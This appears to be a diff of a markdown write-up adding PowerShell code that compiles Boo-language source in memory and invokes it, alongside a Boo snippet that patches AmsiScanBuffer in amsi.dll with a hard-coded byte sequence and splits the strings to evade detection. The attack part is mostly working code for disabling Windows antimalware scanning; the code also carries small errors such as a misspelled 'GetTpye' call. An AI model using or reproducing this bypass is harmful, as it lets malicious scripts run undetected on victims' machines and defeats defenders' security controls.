@@ -33,7 +33,34 @@ function Invoke-BoolangAmsiPatch {
     $BooLangAsm = Load-Assembly($BooLangDLL)
     $BooLangCompilerAsm = Load-Assembly($BooLangCompilerDLL)
     $BooLangParserAsm = Load-Assembly($BooLangParserDLL)
-    $BooSource = @'
+    $BooSource = @' {Code Here} '@
+    
+    $scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new("MyScript.boo", $booSource)
+    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)
+    $parameters.Input.Add($scriptinput) | Out-Null
+    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()
+    $parameters.Ducky = $true
+    $parameters.AddAssembly($BooLangAsm)
+    $parameters.AddAssembly($BoolangExtensionsAsm)
+    $parameters.AddAssembly($BooLangCompilerAsm)
+    $parameters.AddAssembly($BooLangParserAsm)
+    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("mscorlib"))
+    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System"))
+    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System.Core"))
+    $compiler = [Boo.Lang.Compiler.BooCompiler]::new($parameters)
+    Write-Output = "[*] Compiling"
+    $context = $compiler.Run()
+
+    if ($context.GeneratedAssembly -ne $null){
+        Write-Output "[*] Execution"
+        $scriptModule = $context.GeneratedAssembly.GetTpye("MyScriptModule")
+        $mainfunction = $scriptModule.GetMethod("Main")
+        $mainfunction.Invoke($null, $null)
+    }
+    else {
+        Write-Output $context.Errors.ToString($true)
+    }
+}
 }
 ```
 the $BooSource Variable will contain the boolang code
@@ -76,3 +103,5 @@ public static def Main():
 		amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])
 	PatchMem("am"+"si.dll", "Am"+"si"+"Sc"+"AnBu"+"ffer", amsi_patch)
 ```
+
+![image](https://user-images.githubusercontent.com/75935486/154958196-8b4281b8-87d4-4a91-8e11-4d2092358a94.png)
